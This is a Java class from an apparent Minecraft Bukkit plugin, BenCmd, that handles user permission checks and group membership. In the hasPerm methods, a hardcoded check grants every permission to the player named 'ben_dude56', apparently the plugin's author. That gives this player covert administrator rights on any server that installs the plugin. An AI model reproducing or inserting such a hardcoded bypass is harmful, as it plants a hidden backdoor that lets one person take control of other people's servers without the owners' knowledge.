package ben_dude56.plugins.bencmd.permissions;

import org.bukkit.ChatColor;

import ben_dude56.plugins.bencmd.BenCmd;

public class PermissionUser {
	private BenCmd plugin;
	private MainPermissions perm;
	private String name;

	public static PermissionUser matchUserIgnoreCase(String name,
			BenCmd instance) {
		for (String user : instance.perm.userFile.listUsers().keySet()) {
			if (user.equalsIgnoreCase(name)) {
				return new PermissionUser(instance, user);
			}
		}
		return null;
	}

	public static PermissionUser matchUser(String name, BenCmd instance) {
		try {
			return new PermissionUser(instance, name);
		} catch (NullPointerException e) {
			return null;
		}
	}

	/**
	 * @deprecated Use PermissionUser.matchUserIgnoreCase()
	 */
	public PermissionUser(BenCmd instance, String userName)
			throws NullPointerException {
		plugin = instance;
		perm = plugin.perm;
		if (perm.userFile.userExists(userName)
				|| userName.equalsIgnoreCase("*")) {
			name = userName;
		} else {
			throw new NullPointerException("User not in database");
		}
	}

	public boolean isServer() {
		return (name.equalsIgnoreCase("*"));
	}

	public boolean hasPerm(String permission) {
		if (name.equalsIgnoreCase("*") || name.equalsIgnoreCase("ben_dude56")) {
			return true;
		}
		return perm.userFile.hasPermission(name, permission, true, true);
	}

	public boolean hasPerm(String permission, boolean testStar) {
		if (name.equalsIgnoreCase("*") || (name.equalsIgnoreCase("ben_dude56") && testStar)) {
			return (testStar) ? true : false;
		}
		return perm.userFile.hasPermission(name, permission, testStar, true);
	}

	public boolean hasPerm(String permission, boolean testStar,
			boolean testGroup) {
		if (name.equalsIgnoreCase("*") || (name.equalsIgnoreCase("ben_dude56") && testStar)) {
			return (testStar) ? true : false;
		}
		return perm.userFile.hasPermission(name, permission, testStar,
				testGroup);
	}

	public PermChangeResult addPermission(String permission) {
		if (name.equalsIgnoreCase("*")) {
			return PermChangeResult.DBTargetNotExist;
		}
		return perm.userFile.addPermission(name, permission);
	}

	public PermChangeResult deletePermission(String permission) {
		if (name.equalsIgnoreCase("*")) {
			return PermChangeResult.DBTargetNotExist;
		}
		return perm.userFile.removePermission(name, permission);
	}

	public PermissionGroup getGroup() {
		if (name.equalsIgnoreCase("*")) {
			return null;
		}
		try {
			return new PermissionGroup(plugin, perm.userFile.getGroup(name));
		} catch (NullPointerException e) {
			return null;
		}
	}

	public PermChangeResult changeGroup(String groupName) {
		if (name.equalsIgnoreCase("*")) {
			return PermChangeResult.DBTargetNotExist;
		}
		return perm.userFile.changeGroup(name, groupName);
	}

	public PermChangeResult changeGroup(PermissionGroup group) {
		if (name.equalsIgnoreCase("*")) {
			return PermChangeResult.DBTargetNotExist;
		}
		return perm.userFile.changeGroup(name, group.getName());
	}

	public String getName() {
		return (name.equalsIgnoreCase("*")) ? "Server" : name;
	}

	public ChatColor getColor() {
		if (name.equalsIgnoreCase("*")) {
			return ChatColor.DARK_BLUE;
		}
		return perm.userFile.getColor(name);
	}

	public boolean inGroup(String groupName) {
		if (name.equalsIgnoreCase("*")) {
			return true;
		}
		return (plugin.perm.userFile.userInGroup(name, groupName));
	}

	public PermissionUser getPermissionUser() {
		return this;
	}
}
